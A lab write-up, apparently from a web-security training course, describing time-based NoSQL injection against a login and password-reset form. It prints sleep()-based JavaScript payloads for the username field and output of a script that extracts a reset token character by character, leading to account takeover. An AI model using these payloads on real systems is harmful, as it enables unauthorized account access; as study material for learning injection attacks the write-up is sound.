In this version of the lab we are not provided any credentials but we are asked to assets for NOSQLi over a file transfer function that involves a Login/Password reset form.

1)I will start by checking the hardcoded credentials from the HTML source code, but no luck!
```
<label for="passwordInput">Password</label>
            <input class="u-full-width" type="password" placeholder="MySuperSecurePassword123!" name="password" id="passwordInput">
            <input class="button-primary" type="submit" value="Log in">
            
			
```

2)Now we could test for NOSQLi into login page but seems like it checks for User/password field
```
username[$ne]=bmdyy&password[$ne]=MySuperSecurePassword123%21

Response:
<b>Error</b>: Missing <i>'username'</i> parameter
```

3)Next we could try to check that /forgot password reset function? And first we need to ask for a token:
```
Request:
username=admin

Response:
<span style="color:red">A user with this username does not exist</span>

```

4)It's clear that we need to use a valid user, what if we use the user from the example we get the message that token have been sent to the user!

5)After checking the forum for tips someone mentioned that the Time Based needed to be used since the website gave same result for success/failure so testing out the payload from the academy but with the sleep function
`username="+||+(sleep(5000))+||+""=="&password=test`
This result in a delay from /login function which means we have a NOSQLi injection. Knowing this we should be able to guess the password if we take into consideration the response time? About 5 sec.

6)Now googling a bit i stumbled on this JS code that could be used: 
https://portswigger.net/web-security/nosql-injection#timing-based-injection
And we could implement something similar:
`username="+||+(function(x){if(x.password[0]==="A"){sleep(1000)};}(this))+||+""=="&password=test`
And if we run i manually thru the Intruder in Burp-suite and we get a response time of 1000ms(circa 1 sec) then it means that is the password!
```
Remember to iterate thru the chars example
username="+||+(function(x){if(x.token[0]==="A"){sleep(1000)};}(this))+||+""=="&password=test
username="+||+(function(x){if(x.token[1]==="A"){sleep(1000)};}(this))+||+""=="&password=test
username="+||+(function(x){if(x.token[2]==="A"){sleep(1000)};}(this))+||+""=="&password=test
```

7)Running manually should dump the user token and let us reset it's password!
```
┌──(root㉿DESKTOP-1KSM320)-[/home/aleksandar/Downloads]
└─# python3 test.py                                                                                                                                                                                                                                          
[+] Flag: K
[+] Flag: KM
[+] Flag: KM0
[+] Flag: KM0F
[+] Flag: KM0F-
[+] Flag: KM0F-A
[+] Flag: KM0F-AW
[+] Flag: KM0F-AWD
[+] Flag: KM0F-AWD0
[+] Flag: KM0F-AWD0-
[+] Flag: KM0F-AWD0-9
[+] Flag: KM0F-AWD0-91
[+] Flag: KM0F-AWD0-91O
[+] Flag: KM0F-AWD0-91O2
[+] Flag: KM0F-AWD0-91O2-
[+] Flag: KM0F-AWD0-91O2-1
[+] Flag: KM0F-AWD0-91O2-1T
[+] Flag: KM0F-AWD0-91O2-1TP
[+] Flag: KM0F-AWD0-91O2-1TPQ
[+] Flag: KM0F-AWD0-91O2-1TPQ-
[+] Flag: KM0F-AWD0-91O2-1TPQ-7
[+] Flag: KM0F-AWD0-91O2-1TPQ-7A
[+] Flag: KM0F-AWD0-91O2-1TPQ-7A0
[+] Flag: KM0F-AWD0-91O2-1TPQ-7A0A
```


8)Use the token into **/reset**, then **/login** and PROFIT!